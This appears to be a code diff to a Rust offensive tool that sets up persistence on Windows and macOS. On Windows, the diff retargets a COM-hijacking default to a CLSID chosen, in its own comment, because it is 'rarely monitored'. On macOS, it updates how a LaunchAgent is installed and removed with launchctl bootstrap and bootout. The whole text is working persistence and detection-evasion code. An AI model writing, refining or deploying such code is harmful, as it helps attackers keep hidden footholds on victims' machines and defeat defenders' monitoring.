@@ -219,7 +219,10 @@ pub mod windows {
     impl Default for ComHijacking {
         fn default() -> Self {
             // Thumbnail cache handler — loaded by explorer.exe frequently
-            Self { clsid: "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}".to_string() }
+            // {C56A4180-65AA-11D0-A5CC-00A024159FAD} is the MIDI Sequence Object —
+            // a legitimate inprocserver32 registration that is rarely monitored,
+            // unlike the well-known thumbnail-cache CLSID.
+            Self { clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string() }
         }
     }
 
@@ -402,6 +405,16 @@ pub mod macos {
             plist_path = agents_dir.join(format!("{}.plist", self.label));
             std::fs::write(&plist_path, plist)
                 .map_err(|e| anyhow!("LaunchAgent::install: write failed: {}", e))?;
+            // launchctl load -w is deprecated on macOS 10.10+; use the
+            // bootstrap domain command instead.
+            #[cfg(target_os = "macos")]
+            {
+                let uid = unsafe { libc::getuid() };
+                let _ = std::process::Command::new("launchctl")
+                    .args(&["bootstrap", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
+                    .status();
+            }
+            #[cfg(not(target_os = "macos"))]
             let _ = std::process::Command::new("launchctl")
                 .args(&["load", "-w", &plist_path.to_string_lossy()])
                 .status();
@@ -415,6 +428,15 @@ pub mod macos {
                 None => return Ok(()),
             };
             let plist_path = agents_dir.join(format!("{}.plist", self.label));
+            // launchctl unload is deprecated on macOS 10.10+; use bootout.
+            #[cfg(target_os = "macos")]
+            {
+                let uid = unsafe { libc::getuid() };
+                let _ = std::process::Command::new("launchctl")
+                    .args(&["bootout", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
+                    .status();
+            }
+            #[cfg(not(target_os = "macos"))]
             let _ = std::process::Command::new("launchctl")
                 .args(&["unload", &plist_path.to_string_lossy()])
                 .status();
